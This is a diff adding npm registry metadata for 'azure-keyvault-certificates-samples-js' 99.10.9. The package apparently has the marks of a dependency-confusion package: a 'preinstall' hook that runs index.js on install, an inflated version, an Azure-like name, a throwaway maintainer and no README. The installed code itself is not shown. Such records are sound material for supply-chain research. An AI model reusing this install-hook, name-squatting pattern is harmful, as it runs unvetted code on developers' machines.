@@ -1,0 +1,62 @@
+{
+    "_id": "azure-keyvault-certificates-samples-js",
+    "name": "azure-keyvault-certificates-samples-js",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "azure-keyvault-certificates-samples-js",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "azure-keyvault-certificates-samples-js@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-OYjJgzfnlZ6EoFucmCxi75KBBQADjlxunvluyTZ9FGmOAMDmbJyO2q6D0EEOMt6ayQkFcCA5aI4nxzX/UwRDrw==",
+                "shasum": "6a72ffa4bf95af3c20620457edf1006bcb544eb8",
+                "tarball": "https://registry.npmjs.org/azure-keyvault-certificates-samples-js/-/azure-keyvault-certificates-samples-js-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5090,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiOqgPACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmqjOw/8DwasrmMp69ZWx3cq6PV0uYBzMQjfLeqDARBUZXGP6WI498wB\r\n7OV4OvXdBc2xCg5sqZZur/PRSb89f0Rsl129YwWc5qFcMsbZreINM/zw+idy\r\nE2ObsFuJ9fwIEdqEFio6fXT9iE4O6OIRjPsjNGQjdTzXq3RYvOTxOAVP3keX\r\niBlTrBPTY/TlP8PdrDlV7JN0UZAH5w2ZJspn5ECgG8T2L5xvSxNhPbvQNKxJ\r\n1/1AuPOBROaMoiOl8/0Cxp2QVfWr6Z4vXMYaqpCYILZ3cxwSY5pHjeyrh9CL\r\nUSo5yYY3Kbn4H+I29jkxQ+3JWJDJ57M3FL3GTSjGB/wLrECq8JNkZwGpbIgI\r\nmT5XPgaGYWeyL8trrXdEvbdSEUhJA7MVfArwKoImIAkZK2uW1Ae9cRcUHWrh\r\nvY4SIQ/6tyZpgUEyxI1KCLWRUNC4V2bPjs8q6LwqqzOQ5RkXCBov3TuRptGf\r\nvGfP4jjggoICPp1OkWv8516k8qcf/43h9c4iUngX9dyyOqat9xMcDef9h9kZ\r\nWZ6a679g3WZQjiTiimhuoBVKKZG7dIxNDfS5CgDEsP14Z8gWQtHA+md8Y3sb\r\nL1bT8daeD8DfX9kwNYOcr2ag5cWn2hsEvLSrUmbQGgf09N8IpWzNld+CtwOL\r\nPYXUDbBi3R4WrOLm38qm9ewgN/JVRJsGSEs=\r\n=zIwH\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "58a610fw",
+                "email": "58a610fw@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "58a610fw",
+                    "email": "58a610fw@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/azure-keyvault-certificates-samples-js_99.10.9_1648011279716_0.7988925128112436"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T04:54:39.716Z",
+        "99.10.9": "2022-03-23T04:54:39.882Z",
+        "modified": "2022-03-23T04:54:40.013Z"
+    },
+    "maintainers": [
+        {
+            "name": "58a610fw",
+            "email": "58a610fw@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
